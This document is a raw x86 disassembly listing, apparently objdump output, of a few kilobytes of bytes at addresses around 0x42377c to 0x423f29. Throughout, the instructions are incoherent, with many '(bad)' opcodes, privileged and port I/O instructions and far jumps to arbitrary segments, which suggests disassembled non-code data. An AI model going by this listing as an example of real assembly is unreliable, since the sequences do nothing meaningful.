  42377c:	fwait
  42377d:	xchg   ebp,eax
  42377e:	fs and eax,0xf6f4f200
  423784:	push   eax
  423785:	jae    0x423744
  423787:	adc    DWORD PTR [esi+0x42],ebx
  42378a:	inc    edi
  42378b:	cli    
  42378c:	inc    ebx
  42378d:	lea    esp,[ecx+0x39]
  423790:	jne    0x4237c2
  423792:	in     eax,dx
  423793:	sub    DWORD PTR [eax+ebx*1+0x18],esi
  423797:	add    DWORD PTR [ecx+edx*1+0x70],eax
  42379b:	adc    al,0xac
  42379d:	dec    esi
  42379e:	sar    DWORD PTR [ebp+esi*1-0x17],cl
  4237a2:	mul    bl
  4237a4:	mov    ecx,0xdfc93001
  4237a9:	push   ecx
  4237aa:	mov    edx,0x4dfb9c2b
  4237af:	cmp    BYTE PTR [ebx-0x6a],bh
  4237b2:	or     BYTE PTR [edx],dl
  4237b4:	test   al,0x8e
  4237b6:	cdq    
  4237b7:	pop    eax
  4237b8:	xor    al,0x58
  4237ba:	mov    ebp,0x3771baf4
  4237bf:	jle    0x423790
  4237c1:	jge    0x423815
  4237c3:	xlat   BYTE PTR ds:[ebx]
  4237c4:	jae    0x423759
  4237c6:	sub    BYTE PTR [ebx-0x34],ch
  4237c9:	and    cl,BYTE PTR [ecx+0x233ec1da]
  4237cf:	enter  0x59e6,0xd2
  4237d3:	push   ebp
  4237d4:	dec    edi
  4237d5:	mov    al,ds:0x33668634
  4237da:	lahf   
  4237db:	sub    DWORD PTR [edi],eax
  4237dd:	mov    BYTE PTR [ebx+0x27],ah
  4237e0:	loop   0x423782
  4237e2:	cmp    BYTE PTR [ebp-0x5d],al
  4237e5:	jle    0x42382e
  4237e7:	sbb    BYTE PTR [edx-0x3d],dh
  4237ea:	and    bl,BYTE PTR [ebx]
  4237ec:	xchg   edx,eax
  4237ed:	jge    0x42381b
  4237ef:	pop    edx
  4237f0:	das    
  4237f1:	sub    al,0xe6
  4237f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237f4:	pop    edx
  4237f5:	nop
  4237f6:	arpl   WORD PTR [eax],bx
  4237f8:	daa    
  4237f9:	sub    al,0x92
  4237fb:	jne    0x42379e
  4237fd:	shl    ebx,cl
  4237ff:	or     dh,BYTE PTR [esi]
  423801:	jb     0x42379b
  423803:	test   DWORD PTR [edx-0x12],edx
  423806:	add    esp,DWORD PTR [ebp+0x6f]
  423809:	es and eax,0x26fdcf74
  42380f:	cmp    DWORD PTR [eax+0x49],esi
  423812:	push   esp
  423813:	xor    DWORD PTR [eax-0x35],0x5c570ddc
  42381a:	pop    edx
  42381b:	and    esp,DWORD PTR [ebx+0x68]
  42381e:	(bad)  
  423820:	hlt    
  423821:	neg    BYTE PTR [edi]
  423823:	jbe    0x4237d1
  423825:	lods   al,BYTE PTR ds:[esi]
  423826:	stos   DWORD PTR es:[edi],eax
  423827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423828:	test   BYTE PTR [eax],cl
  42382a:	test   al,0xc0
  42382c:	ss push ds
  42382e:	(bad)  
  42382f:	daa    
  423830:	mov    edx,0x171f7cc
  423835:	cli    
  423836:	cs cdq 
  423838:	jl     0x4237d3
  42383a:	arpl   WORD PTR [eax-0x27aa54f2],cx
  423840:	sub    al,0xca
  423842:	lods   ax,WORD PTR ds:[esi]
  423844:	mov    al,ds:0x66140ba9
  423849:	jb     0x42387d
  42384b:	into   
  42384c:	fs leave 
  42384e:	enter  0x9d15,0x36
  423852:	stos   DWORD PTR es:[edi],eax
  423853:	adc    al,0x8c
  423855:	push   0x67c94460
  42385a:	stc    
  42385b:	jb     0x423818
  42385d:	mov    ebp,0x4c2841a8
  423862:	push   ss
  423863:	repnz sub al,ah
  423866:	sbb    bh,cl
  423868:	jo     0x42389d
  42386a:	sub    ah,BYTE PTR [edx+edx*2+0x12437da6]
  423871:	jle    0x42380e
  423873:	mov    DWORD PTR [edx+0x6a],ecx
  423876:	add    al,0x60
  423878:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423879:	sub    BYTE PTR [esi-0x78],bl
  42387c:	retf   
  42387d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42387e:	bound  ecx,QWORD PTR [edx]
  423880:	sbb    ecx,DWORD PTR [esi-0x6d]
  423883:	inc    edx
  423884:	or     ch,BYTE PTR [esi+0x67]
  423887:	pop    ebx
  423888:	int3   
  423889:	mov    ch,0x90
  42388b:	inc    esi
  42388c:	sbb    DWORD PTR [ebx+0x5111e43c],edi
  423892:	jmp    0xbd355ae1
  423897:	cmp    dh,ah
  423899:	repz xchg ebx,eax
  42389b:	scas   eax,DWORD PTR es:[edi]
  42389c:	cld    
  42389d:	mov    ebx,0x2996ca21
  4238a2:	(bad)  
  4238a3:	or     BYTE PTR [ecx+0x16],ch
  4238a6:	push   ds
  4238a7:	cmp    eax,0x65e0e7da
  4238ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238ad:	popa   
  4238ae:	(bad)  [esp+ecx*1-0x6c485bd5]
  4238b5:	jno    0x42385d
  4238b7:	inc    eax
  4238b8:	adc    DWORD PTR [ecx-0x3d],edi
  4238bb:	push   ss
  4238bc:	fdivr  QWORD PTR [ecx]
  4238be:	sub    eax,0xe0e9b96d
  4238c3:	and    DWORD PTR [eax+0x58],ecx
  4238c6:	xchg   ecx,eax
  4238c7:	test   BYTE PTR ds:0x6d8751e2,bh
  4238cd:	push   edx
  4238ce:	xchg   ebp,eax
  4238cf:	int3   
  4238d0:	retf   0x658
  4238d3:	jmp    0x4238ba
  4238d5:	mov    bl,0xda
  4238d7:	mov    al,0x2d
  4238d9:	xor    esp,ebp
  4238db:	mov    BYTE PTR [esp+esi*8-0x7b9fb205],bl
  4238e2:	(bad)  
  4238e3:	pop    edx
  4238e4:	hlt    
  4238e5:	call   0x474651c1
  4238ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238eb:	xlat   BYTE PTR ds:[ebx]
  4238ec:	mov    ebp,0x47dc8170
  4238f1:	cmp    BYTE PTR [esi+esi*1],0x5f
  4238f5:	shl    BYTE PTR [eax+0x64066cdc],0x56
  4238fc:	and    eax,0xc8c937b9
  423901:	bound  ecx,QWORD PTR [esi-0x6d]
  423904:	xchg   esi,eax
  423905:	adc    ebx,DWORD PTR [esi-0x15]
  423908:	fldenv [ebp-0x37]
  42390b:	jns    0x423926
  42390d:	dec    ecx
  42390e:	pop    esi
  42390f:	push   0x43d7ddfc
  423914:	push   ds
  423915:	xlat   BYTE PTR ds:[ebx]
  423916:	mov    ebx,0x3f6922ec
  42391b:	sbb    edi,DWORD PTR [ebp+0x600eda0e]
  423921:	xchg   ebp,eax
  423922:	mov    esp,0x2ad7c960
  423927:	mov    ebp,0x3d4e0c8d
  42392c:	retf   
  42392d:	(bad)  
  42392e:	and    al,0x1
  423930:	imul   edi,DWORD PTR [esi+eiz*2],0xffffff8f
  423934:	mov    ebx,DWORD PTR [ebx+ebp*4+0x2a]
  423938:	mov    ds:0x56d01cf1,eax
  42393d:	mov    ebp,0x2efd5e9d
  423942:	fiadd  DWORD PTR [esi+0xfb8a05]
  423948:	xor    esp,DWORD PTR ds:0x623e6fc7
  42394e:	outs   dx,BYTE PTR ds:[esi]
  42394f:	jp     0x423901
  423951:	in     al,dx
  423952:	int3   
  423953:	inc    esp
  423954:	fldcw  WORD PTR [edi]
  423956:	mov    eax,ds:0x9d9a0aab
  42395b:	fidivr WORD PTR [ecx-0xa]
  42395e:	add    BYTE PTR [edi-0x56d7c0e8],dh
  423964:	mov    ecx,cs
  423966:	ret    0xa73c
  423969:	xchg   edx,eax
  42396a:	mov    WORD PTR [eax-0x63],gs
  42396d:	push   esi
  42396e:	hlt    
  42396f:	mov    ebx,0x99c6af67
  423974:	loop   0x4239c7
  423976:	or     al,0x79
  423978:	mov    ch,0x16
  42397a:	jmp    0x17b7ba8d
  42397f:	push   ebp
  423980:	pop    edx
  423981:	dec    ebx
  423982:	out    0x3e,eax
  423984:	out    0xbe,al
  423986:	or     cl,BYTE PTR [ecx+0x5c]
  423989:	scas   eax,DWORD PTR es:[edi]
  42398a:	imul   esi,DWORD PTR ds:0x5a1c5355,0xffffffce
  423991:	test   eax,0xcbd49986
  423996:	dec    ebx
  423997:	pop    esp
  423998:	sbb    edx,edx
  42399a:	mov    BYTE PTR [eax],0xff
  42399d:	push   ss
  42399e:	mov    dl,0x2a
  4239a0:	lds    ebx,FWORD PTR [ebp-0x265783ea]
  4239a6:	adc    eax,0x38bc9f1b
  4239ab:	in     al,dx
  4239ac:	retf   0xb69e
  4239af:	fcom   QWORD PTR [ecx-0x71c9135d]
  4239b5:	shr    DWORD PTR [esp+esi*2-0x3996e244],0xbb
  4239bd:	call   0xade7:0x66eb866d
  4239c4:	or     eax,0xffffffe5
  4239c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239c8:	test   al,0x6a
  4239ca:	enter  0x3853,0xbf
  4239ce:	and    ebx,DWORD PTR [edx-0x37e305ab]
  4239d4:	fmul   DWORD PTR [edi]
  4239d6:	enter  0xcb8b,0xec
  4239da:	cld    
  4239db:	call   0xdfd54e06
  4239e0:	inc    eax
  4239e1:	loope  0x4239d6
  4239e3:	xor    bl,BYTE PTR [ebx-0x19d5b62b]
  4239e9:	fimul  WORD PTR [ebp+0x75]
  4239ec:	inc    edx
  4239ed:	sub    bh,0x43
  4239f0:	push   0xf694c0aa
  4239f5:	adc    ebx,DWORD PTR [ecx]
  4239f7:	mov    ecx,eax
  4239f9:	ja     0x423a25
  4239fb:	dec    ebp
  4239fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239fd:	dec    esp
  4239fe:	add    BYTE PTR [eax],al
  423a00:	add    BYTE PTR [eax],al
  423a02:	inc    esi
  423a03:	xchg   edi,eax
  423a04:	daa    
  423a05:	cmp    esi,edi
  423a07:	mov    ebx,0x9b53ff5e
  423a0c:	and    ebx,DWORD PTR [ebp-0x73a1c377]
  423a12:	pop    ebp
  423a13:	mov    bl,0x1
  423a15:	add    ah,dh
  423a17:	add    al,0x0
  423a19:	add    bl,dl
  423a1b:	in     al,0x1a
  423a1d:	push   ebx
  423a1e:	nop
  423a1f:	(bad)  
  423a20:	xchg   ecx,eax
  423a21:	pop    ds
  423a22:	jmp    0x7cb73607
  423a27:	jmp    0x423a3b
  423a29:	xor    ch,BYTE PTR [edx]
  423a2b:	xor    edx,DWORD PTR [eax+0x43d72525]
  423a31:	inc    esp
  423a32:	lock push 0x406d7ef8
  423a38:	inc    ecx
  423a39:	mov    ah,0x54
  423a3b:	dec    ecx
  423a3c:	and    al,0xc0
  423a3e:	and    dl,BYTE PTR [ebp+0x56d180ee]
  423a44:	add    cl,BYTE PTR [ebp+edx*2-0x1a]
  423a48:	push   0xe331ff28
  423a4d:	mov    ch,BYTE PTR [eax+esi*2-0x4f920081]
  423a54:	inc    esi
  423a55:	xor    DWORD PTR [edi+0x7f],esi
  423a58:	xor    ebx,ecx
  423a5a:	fwait
  423a5b:	mov    DWORD PTR [ebx],edi
  423a5d:	and    eax,0xfc819c23
  423a62:	sbb    DWORD PTR [esi],edx
  423a64:	sbb    edi,ebp
  423a66:	cmp    cl,cl
  423a68:	adc    edx,DWORD PTR [ebx-0x3]
  423a6b:	mov    ch,0xcb
  423a6d:	fadd   st,st(2)
  423a6f:	test   al,0x1d
  423a71:	cld    
  423a72:	mov    al,ds:0x45867344
  423a77:	sbb    ecx,DWORD PTR [edi+0x36]
  423a7a:	shr    DWORD PTR [ebp+0x615b2441],1
  423a80:	jnp    0x423a66
  423a82:	call   0x5fba:0xe062ad46
  423a89:	call   0xa995:0xb2b0a336
  423a90:	mov    di,0x4d82
  423a94:	push   0xffffff9b
  423a96:	dec    ebp
  423a97:	dec    esp
  423a98:	fst    QWORD PTR [esi-0x1e]
  423a9b:	scas   eax,DWORD PTR es:[edi]
  423a9c:	or     BYTE PTR [esi-0x77e4313d],0x75
  423aa3:	fcom   DWORD PTR [ebp+0x7c]
  423aa6:	mov    ch,0x79
  423aa8:	jmp    0xd24ccfe6
  423aad:	(bad)  
  423aae:	pop    ds
  423aaf:	outs   dx,DWORD PTR ds:[esi]
  423ab0:	adc    BYTE PTR [edi+0x7e],ah
  423ab3:	fdiv   QWORD PTR [eax-0x447210cb]
  423ab9:	shr    DWORD PTR [ecx+edx*8],0xc8
  423abd:	mov    ah,0x97
  423abf:	push   0x54
  423ac1:	sbb    eax,0xf12d20fd
  423ac6:	and    DWORD PTR [ebx],ecx
  423ac8:	data16 mov bl,0x44
  423acb:	mov    eax,gs:0xf6e1b98e
  423ad1:	jb     0x423b10
  423ad3:	jmp    0x7b71b3d8
  423ad8:	sbb    BYTE PTR [eax],dh
  423ada:	xor    cl,0xc2
  423add:	add    al,0xb0
  423adf:	dec    ecx
  423ae0:	xor    al,BYTE PTR [eax+0x51]
  423ae3:	cli    
  423ae4:	xor    eax,0x8a6026dd
  423ae9:	jl     0x423afe
  423aeb:	sti    
  423aec:	retf   
  423aed:	and    bh,BYTE PTR [edi+edx*4+0x6b]
  423af1:	(bad)  
  423af2:	cmp    DWORD PTR [esi-0x7c],esi
  423af5:	iret   
  423af6:	fisttp QWORD PTR [edi-0x2a0fcf26]
  423afc:	mov    cl,0x5d
  423afe:	mov    eax,0x6d669552
  423b03:	aas    
  423b04:	and    BYTE PTR [ebx+eax*1-0x5c74375b],0x4d
  423b0c:	add    al,0x30
  423b0e:	popf   
  423b0f:	adc    dh,ch
  423b11:	mov    ebx,0x5985af3c
  423b16:	xor    eax,DWORD PTR [eax+ebp*2]
  423b19:	push   eax
  423b1a:	mov    bh,BYTE PTR [ecx+ecx*2+0x7aa723fd]
  423b21:	xchg   esi,eax
  423b22:	pop    ebp
  423b23:	jmp    0x423ac6
  423b25:	mov    bh,BYTE PTR [ebx+eax*4-0x3e]
  423b29:	or     ebp,DWORD PTR [ecx+0x177e72c0]
  423b2f:	mov    ecx,0x724e6262
  423b34:	out    0xe9,eax
  423b36:	stc    
  423b37:	pop    es
  423b38:	leave  
  423b39:	lods   eax,DWORD PTR ds:[esi]
  423b3a:	xor    ecx,esp
  423b3c:	and    eax,esi
  423b3e:	mov    WORD PTR [ecx-0x46a0ed2],?
  423b44:	jae    0x423b46
  423b46:	cmp    BYTE PTR [ebx+0x4b],dh
  423b49:	add    DWORD PTR [esi],ebp
  423b4b:	xor    edx,DWORD PTR [ebx+ebp*8-0x23df58fc]
  423b52:	mov    ch,0xc2
  423b54:	or     al,0x72
  423b56:	xor    al,0x3f
  423b58:	sbb    eax,0x982bfa9a
  423b5d:	jno    0x423bd6
  423b5f:	inc    edi
  423b60:	stc    
  423b61:	xor    al,0xdb
  423b63:	or     esp,DWORD PTR [eax-0x58]
  423b66:	xchg   ebp,eax
  423b67:	frstor [ebp+edi*2-0x5130e462]
  423b6e:	in     al,dx
  423b6f:	xlat   BYTE PTR ds:[ebx]
  423b70:	mov    edx,0x421c3dd8
  423b75:	test   BYTE PTR [eax],ah
  423b77:	jnp    0x423b8e
  423b79:	cli    
  423b7a:	retf   0x301b
  423b7d:	in     al,dx
  423b7e:	push   ebx
  423b7f:	or     edi,DWORD PTR ds:[ebx]
  423b82:	bound  ebp,QWORD PTR [edi]
  423b84:	int    0xc3
  423b86:	cs cmp dh,dl
  423b89:	mov    esp,DWORD PTR es:[esi+0x69]
  423b8d:	dec    esp
  423b8e:	stos   DWORD PTR es:[edi],eax
  423b8f:	ret    0x4880
  423b92:	jnp    0x423bed
  423b94:	mov    edx,0xef6dba68
  423b99:	pop    ecx
  423b9a:	shr    BYTE PTR [esi],cl
  423b9c:	(bad)  
  423b9d:	add    BYTE PTR [edx-0x55],ch
  423ba0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ba1:	mov    ?,eax
  423ba3:	inc    esi
  423ba4:	xchg   esp,eax
  423ba5:	out    dx,eax
  423ba6:	retf   
  423ba7:	pop    esi
  423ba8:	ins    DWORD PTR es:[edi],dx
  423ba9:	or     DWORD PTR [edx*1-0x3a10625],eax
  423bb0:	add    eax,0xf6a6438c
  423bb5:	ja     0x423b93
  423bb7:	ja     0x423b4a
  423bb9:	or     al,BYTE PTR [ebx]
  423bbb:	jle    0x423b6f
  423bbd:	sbb    al,0x16
  423bbf:	jle    0x423be0
  423bc1:	repz mov ecx,0x8cf95747
  423bc7:	inc    ebx
  423bc8:	scas   eax,DWORD PTR es:[edi]
  423bc9:	(bad)  
  423bca:	cmp    eax,0x532ed44b
  423bcf:	fchs   
  423bd1:	and    BYTE PTR [edi-0x62],bl
  423bd4:	mov    eax,0x48ecfb08
  423bd9:	test   ch,bl
  423bdb:	stos   DWORD PTR es:[edi],eax
  423bdc:	xor    ebx,DWORD PTR [ebx+esi*8-0x560e35b2]
  423be3:	stos   DWORD PTR es:[edi],eax
  423be4:	adc    eax,0x830974bd
  423be9:	dec    ecx
  423bea:	int    0x82
  423bec:	rcl    esi,1
  423bee:	dec    esi
  423bef:	lods   al,BYTE PTR ds:[esi]
  423bf0:	out    dx,eax
  423bf1:	arpl   WORD PTR [esi],di
  423bf3:	sub    eax,0x78c73b86
  423bf8:	and    esi,DWORD PTR [edi]
  423bfa:	xor    bh,BYTE PTR [esi+0x69728c0b]
  423c00:	fwait
  423c01:	cli    
  423c02:	push   es
  423c03:	call   0x305a:0x8f334bbe
  423c0a:	(bad)  
  423c0b:	xchg   ecx,eax
  423c0c:	imul   ebp
  423c0e:	jecxz  0x423bc3
  423c10:	les    esp,FWORD PTR [ebx+ebx*1]
  423c13:	(bad)  
  423c14:	mov    ch,0xb0
  423c16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c17:	loop   0x423c20
  423c19:	mov    eax,ds:0x45dfdfc0
  423c1e:	push   edx
  423c1f:	aad    0xaa
  423c21:	pop    ecx
  423c22:	in     al,dx
  423c23:	popa   
  423c24:	jmp    0x4f6a:0xb1e91da8
  423c2b:	ins    BYTE PTR es:[edi],dx
  423c2c:	adc    esi,eax
  423c2e:	outs   dx,DWORD PTR ds:[esi]
  423c2f:	ror    esi,1
  423c31:	cdq    
  423c32:	lods   al,BYTE PTR ds:[esi]
  423c33:	fs xchg esp,eax
  423c35:	jecxz  0x423bc9
  423c37:	pusha  
  423c38:	mov    ds:0xbc6dabee,eax
  423c3d:	sbb    ah,BYTE PTR [ecx]
  423c3f:	(bad)
  423c44:	xchg   ecx,eax
  423c45:	and    al,0x18
  423c47:	sub    bh,BYTE PTR [edi]
  423c49:	xchg   edi,eax
  423c4a:	fiadd  DWORD PTR [ebp-0x52eda7ec]
  423c50:	pop    es
  423c51:	(bad)  
  423c52:	lea    edx,[ecx-0x32]
  423c55:	es inc esp
  423c57:	icebp  
  423c58:	call   0xeb28:0xf211b0e8
  423c5f:	gs push ebp
  423c61:	mov    edi,0xe952b344
  423c66:	cs iret 
  423c68:	inc    eax
  423c69:	and    BYTE PTR [edi+0x20a37da9],dh
  423c6f:	scas   al,BYTE PTR es:[edi]
  423c70:	xchg   ebp,eax
  423c71:	dec    esi
  423c72:	cmp    eax,0x96dbde76
  423c77:	repz inc esp
  423c79:	out    0xc8,eax
  423c7b:	fst    st(1)
  423c7d:	fidiv  DWORD PTR [edi-0x3945f185]
  423c83:	ss or  eax,0x687ba82b
  423c89:	hlt    
  423c8a:	not    BYTE PTR [ebx-0x2d]
  423c8d:	xor    BYTE PTR [ebx],dl
  423c8f:	sub    DWORD PTR [ebx],eax
  423c91:	pop    ebp
  423c92:	push   eax
  423c93:	dec    edi
  423c94:	cmp    bh,al
  423c96:	mov    edi,0xec213ab9
  423c9b:	inc    esp
  423c9c:	push   ebp
  423c9d:	(bad)  
  423c9e:	cli    
  423c9f:	xor    BYTE PTR [eax-0x33],ah
  423ca2:	popf   
  423ca3:	mov    BYTE PTR [ebp-0xc],bh
  423ca6:	stos   BYTE PTR es:[edi],al
  423ca7:	mov    ds:0x886ddf01,eax
  423cac:	push   esi
  423cad:	push   ds
  423cae:	aam    0x99
  423cb0:	mov    eax,ds:0xe288548d
  423cb5:	sti    
  423cb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cb7:	pop    ebp
  423cb8:	ret    0x79cf
  423cbb:	or     ch,0xf7
  423cbe:	dec    edx
  423cbf:	inc    esp
  423cc0:	dec    ecx
  423cc1:	mov    bh,BYTE PTR [esi+ecx*2-0x314e2033]
  423cc8:	sub    ebp,ebx
  423cca:	sbb    BYTE PTR [ebp+0x746b895b],0xb8
  423cd1:	sub    DWORD PTR [edx-0x51],0xfffffffa
  423cd5:	(bad)  
  423cd7:	in     al,0x94
  423cd9:	push   esi
  423cda:	jl     0x423c70
  423cdc:	adc    bl,0x47
  423cdf:	gs or  al,0xde
  423ce2:	xor    ebp,DWORD PTR [edx-0x48f4e1ae]
  423ce8:	or     DWORD PTR [edx+0x65e84388],ebx
  423cee:	jle    0x423c85
  423cf0:	(bad)  
  423cf1:	xchg   edx,eax
  423cf2:	sahf   
  423cf3:	xchg   DWORD PTR [esi+0x70],esi
  423cf6:	cmp    BYTE PTR [esp+ecx*8-0x7f],ah
  423cfa:	inc    esi
  423cfb:	xchg   ebp,eax
  423cfc:	xor    DWORD PTR [esi+0x18],ebp
  423cff:	or     DWORD PTR [edx+ecx*8-0x2ac9ca64],ecx
  423d06:	iret   
  423d07:	in     eax,dx
  423d08:	sub    DWORD PTR [ebx-0x27],ebx
  423d0b:	ja     0x423d7a
  423d0d:	leave  
  423d0e:	hlt    
  423d0f:	jg     0x423cb1
  423d11:	mov    ecx,0x1741fa15
  423d16:	pop    ebp
  423d17:	jle    0x423d91
  423d19:	dec    edx
  423d1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d1b:	test   DWORD PTR [edi+0x5b3f9fa8],0x9008cc42
  423d25:	imul   ebp,edx,0xc64e4262
  423d2b:	outs   dx,DWORD PTR ds:[esi]
  423d2c:	dec    eax
  423d2d:	dec    edi
  423d2e:	xchg   esp,eax
  423d2f:	push   edx
  423d30:	shr    DWORD PTR [edx],1
  423d32:	xchg   edx,eax
  423d33:	in     eax,0xc6
  423d35:	test   DWORD PTR [edi+0x2c4b6e5c],0x63272855
  423d3f:	pop    ss
  423d40:	out    dx,eax
  423d41:	xchg   esp,eax
  423d42:	cmp    eax,0xa843a344
  423d47:	jne    0x423dbc
  423d49:	inc    ebx
  423d4a:	cld    
  423d4b:	mov    DWORD PTR [edx-0x61],ebp
  423d4e:	mov    bl,dl
  423d50:	sbb    BYTE PTR [ebp+0x1fa08ba0],0xe
  423d57:	adc    al,0xc6
  423d59:	fdivr  DWORD PTR ds:0x8bdc2dfc
  423d5f:	scas   eax,DWORD PTR es:[edi]
  423d60:	mov    dh,0x3a
  423d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d63:	pop    ds
  423d64:	ja     0x423da1
  423d66:	fs pop ds
  423d68:	jnp    0x423dc2
  423d6a:	sbb    DWORD PTR [edi],0x27abe7e9
  423d70:	jnp    0x423d85
  423d72:	in     al,0x6c
  423d74:	mov    cl,0x51
  423d76:	mov    ch,BYTE PTR [edi+eax*2-0x66]
  423d7a:	jg     0x423cfe
  423d7c:	outs   dx,BYTE PTR ds:[esi]
  423d7d:	mov    cl,0xfe
  423d7f:	lock (bad) 
  423d81:	call   FWORD PTR [edx+esi*8+0x50]
  423d85:	inc    edx
  423d86:	mov    edi,0x199d55
  423d8b:	push   esi
  423d8c:	xlat   BYTE PTR ds:[ebx]
  423d8d:	(bad)  
  423d8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d8f:	loop   0x423da1
  423d91:	stos   DWORD PTR es:[edi],eax
  423d92:	mov    bh,BYTE PTR [eax]
  423d94:	jge    0x423dbc
  423d96:	or     eax,0x7750e409
  423d9b:	imul   ebx,ecx,0x94805d24
  423da1:	inc    ebp
  423da2:	mov    ?,esp
  423da4:	inc    edi
  423da5:	std    
  423da6:	or     eax,0x7b093377
  423dab:	or     dl,cl
  423dad:	gs test eax,0x8a083a06
  423db3:	inc    edi
  423db4:	jbe    0x423dc6
  423db6:	adc    BYTE PTR [ebx-0x2ecc74da],al
  423dbc:	and    DWORD PTR [edi-0xe12fc29],esp
  423dc2:	add    DWORD PTR [esi-0xc],ebx
  423dc5:	mov    ds:0x19390879,eax
  423dca:	leave  
  423dcb:	or     al,0x76
  423dcd:	and    dl,dh
  423dcf:	scas   al,BYTE PTR es:[edi]
  423dd0:	mov    bl,0x1f
  423dd2:	out    0x59,eax
  423dd4:	or     al,0xe1
  423dd6:	pop    eax
  423dd7:	xchg   edx,eax
  423dd8:	test   al,0x65
  423dda:	enter  0xe66d,0x4c
  423dde:	sbb    al,0x65
  423de0:	pop    es
  423de1:	dec    ebx
  423de2:	adc    dl,ch
  423de4:	in     eax,0x2d
  423de6:	popf   
  423de7:	and    eax,0xedc1af2a
  423dec:	aaa    
  423ded:	and    DWORD PTR [edx],edx
  423def:	int3   
  423df0:	fsub   DWORD PTR [ebx]
  423df2:	push   ecx
  423df3:	mov    ecx,0xa318a3c
  423df8:	loope  0x423e59
  423dfa:	sbb    al,0xd7
  423dfc:	leave  
  423dfd:	xchg   esp,eax
  423dfe:	retf   0xf535
  423e01:	fsub   st(5),st
  423e03:	(bad)
  423e06:	xor    eax,0xdf2c2557
  423e0b:	shr    ebx,0xd9
  423e0e:	jo     0x423e0d
  423e10:	sar    BYTE PTR [esi-0x7e],1
  423e13:	push   0xffffffc8
  423e15:	aaa    
  423e16:	retf   0xeed8
  423e19:	pop    ecx
  423e1a:	loop   0x423dcb
  423e1c:	ja     0x423e31
  423e1e:	mov    BYTE PTR [bp+si+0x19],bl
  423e22:	inc    esp
  423e23:	jg     0x423e46
  423e25:	xchg   esp,eax
  423e26:	dec    esi
  423e27:	push   esp
  423e28:	mov    bh,0xa5
  423e2a:	xlat   BYTE PTR ds:[ebx]
  423e2b:	stos   BYTE PTR es:[edi],al
  423e2c:	ja     0x423e64
  423e2e:	add    ch,cl
  423e30:	xchg   ebp,eax
  423e31:	movhps QWORD PTR [edx+0x2c53394c],xmm6
  423e38:	into   
  423e39:	dec    ecx
  423e3a:	mov    al,0x9
  423e3c:	call   0x41ece45
  423e41:	jno    0x423e1b
  423e43:	jmp    0x97294ef9
  423e48:	lea    ebx,[edx]
  423e4a:	mov    esi,0x180e5aa3
  423e4f:	sbb    DWORD PTR gs:[edx],ebp
  423e52:	jmp    0x423e41
  423e54:	ds dec ecx
  423e56:	in     eax,0x77
  423e58:	mov    al,ds:0x424cc0b6
  423e5d:	push   es
  423e5e:	adc    ebp,DWORD PTR [eax]
  423e60:	aas    
  423e61:	or     dh,bl
  423e63:	sub    BYTE PTR [eax-0xc],bh
  423e66:	xchg   ebp,eax
  423e67:	mov    eax,ds:0xd5b179eb
  423e6c:	mov    esi,0x46bae7e4
  423e71:	jecxz  0x423e89
  423e73:	std    
  423e74:	in     al,0x7e
  423e76:	cmc    
  423e77:	jmp    0x28c372ae
  423e7c:	adc    al,0x91
  423e7e:	imul   edi,DWORD PTR [edx+0x683c66d3],0x58
  423e85:	loop   0x423eef
  423e87:	call   0x9584:0x37491db3
  423e8e:	inc    edx
  423e8f:	cmp    esi,ecx
  423e91:	addr16 shl dh,cl
  423e94:	int    0xf6
  423e96:	fwait
  423e97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e98:	(bad)  
  423e9a:	scas   al,BYTE PTR es:[edi]
  423e9b:	imul   eax,eax,0xcda10fd7
  423ea1:	mov    eax,ds:0x63956153
  423ea6:	mov    WORD PTR [ebx-0x6d4995f0],cs
  423eac:	mov    cl,0x36
  423eae:	mov    edx,0xfd18fde4
  423eb3:	and    eax,DWORD PTR [esi]
  423eb5:	pusha  
  423eb6:	or     al,BYTE PTR [esi+0x195ad80a]
  423ebc:	sbb    BYTE PTR [esi],bl
  423ebe:	and    cl,BYTE PTR [eax-0x48]
  423ec1:	push   edx
  423ec2:	push   esp
  423ec3:	neg    esp
  423ec5:	jge    0x423ec1
  423ec7:	les    edx,FWORD PTR [edi]
  423ec9:	cld    
  423eca:	dec    ecx
  423ecb:	sti    
  423ecc:	mov    BYTE PTR [esi-0x48],bl
  423ecf:	adc    ah,BYTE PTR [ebp-0x3f]
  423ed2:	dec    esi
  423ed3:	stos   BYTE PTR es:[edi],al
  423ed4:	sbb    cl,BYTE PTR [ebx+eax*2+0x19]
  423ed8:	addr16 adc al,0x4f
  423edb:	cmp    al,0x77
  423edd:	xchg   ebx,eax
  423ede:	xor    DWORD PTR [edx+0x7],ecx
  423ee1:	push   esp
  423ee2:	and    al,0xe2
  423ee4:	loop   0x423f40
  423ee6:	sbb    al,0x48
  423ee8:	lock call 0xdeaf:0xde88a8ac
  423ef0:	push   ebp
  423ef1:	hlt    
  423ef2:	mov    esi,0xf07f4456
  423ef7:	adc    edi,DWORD PTR [esi+0x14]
  423efa:	sahf   
  423efb:	pop    eax
  423efc:	pop    edx
  423efd:	aad    0x8a
  423eff:	sbb    eax,0x270d6e67
  423f04:	sbb    BYTE PTR [eax-0x25],cl
  423f07:	(bad)  
  423f08:	sti    
  423f09:	cmp    DWORD PTR [edx],edi
  423f0b:	retf   
  423f0c:	sub    al,0x9c
  423f0e:	add    BYTE PTR [eax],al
  423f10:	add    BYTE PTR [eax],al
  423f12:	sar    al,cl
  423f14:	data16 outs dx,BYTE PTR es:[esi]
  423f17:	mov    esi,0x8c85fcd2
  423f1c:	out    dx,al
  423f1d:	(bad)  
  423f1f:	jns    0x423f28
  423f21:	mov    edx,0x1b851
  423f26:	hlt    
  423f27:	add    al,0x0
  423f29:	add    BYTE PTR [ecx-0x1458b153],bh
